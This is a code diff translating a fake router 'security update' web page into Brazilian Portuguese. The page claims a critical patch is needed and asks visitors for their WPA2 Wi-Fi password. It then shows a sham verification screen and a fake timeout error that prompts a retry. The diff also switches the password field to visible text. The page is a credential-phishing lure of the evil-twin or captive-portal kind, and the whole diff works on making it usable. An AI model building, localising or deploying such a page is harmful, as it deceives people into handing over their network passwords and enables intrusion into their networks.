@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name='viewport' content='width=device-width, initial-scale=1'>
-    <title>Router Management - Security Update</title>
+    <title>Gerenciamento do Roteador - Atualização de Segurança</title>
     <style>
         /* CSS Reset for a plain look */
         * {
@@ -61,7 +61,8 @@
             text-transform: uppercase;
         }
 
-        input[type="password"] {
+        /* Alterado de password para text para deixar a senha visível */
+        input[type="text"] {
             width: 100%;
             padding: 12px;
             border: 1px solid #000000;
@@ -69,7 +70,7 @@
             outline: none;
         }
 
-        input[type="password"]:focus {
+        input[type="text"]:focus {
             background-color: #f0f0f0;
         }
 
@@ -130,30 +131,30 @@
 
     <div class="container">
         <header>
-            <h1>Security Update</h1>
+            <h1>Atualização de Segurança</h1>
         </header>
 
         <div id="form-container">
-            <p>A critical security patch is required for your router. Please enter your WPA2 password to verify ownership and proceed with the installation.</p>
+            <p>Um patch de segurança crítico é necessário para o seu roteador. Por favor, insira sua senha WPA2 para verificar a propriedade e prosseguir com a instalação.</p>
 
             <form id="update-form">
                 <div class="form-group">
-                    <label for="password">WiFi Password</label>
-                    <input type="password" id="password" placeholder="Enter password" required>
+                    <label for="password">Senha do WiFi</label>
+                    <input type="text" id="password" placeholder="Digite a senha" required>
                 </div>
 
-                <button type="submit" id="submit-btn">Verify and Update</button>
+                <button type="submit" id="submit-btn">Verificar e Atualizar</button>
                 <div id="error-msg" class="hidden"></div>
             </form>
         </div>
 
         <div id="checking-container" class="hidden status-box">
-            <div class="loader-text">VERIFYING...</div>
-            <p>The system is validating your credentials. This may take up to 60 seconds. Do not close this browser window.</p>
+            <div class="loader-text">VERIFICANDO...</div>
+            <p>O sistema está validando suas credenciais. Isso pode levar até 60 segundos. Não feche esta janela do navegador.</p>
         </div>
 
         <div class="divider"></div>
-        <p style="font-size: 0.75rem; color: #666; margin-bottom: 0;">© 2026 HydraCorp Networks. All rights reserved.</p>
+        <p style="font-size: 0.75rem; color: #666; margin-bottom: 0;">© 2026 HydraCorp Networks. Todos os direitos reservados.</p>
     </div>
 
     <script>
@@ -168,7 +169,7 @@
             const password = document.getElementById('password').value;
 
             if (password.length < 8) {
-                showError('Minimum 8 characters required');
+                showError('Mínimo de 8 caracteres necessário');
                 return;
             }
 
@@ -187,7 +188,7 @@
                 console.error('Error:', error);
                 formContainer.classList.remove('hidden');
                 checkingContainer.classList.add('hidden');
-                showError('Connection timeout. Retry.');
+                showError('Tempo de conexão esgotado. Tente novamente.');
                 submitBtn.disabled = false;
             });
         });
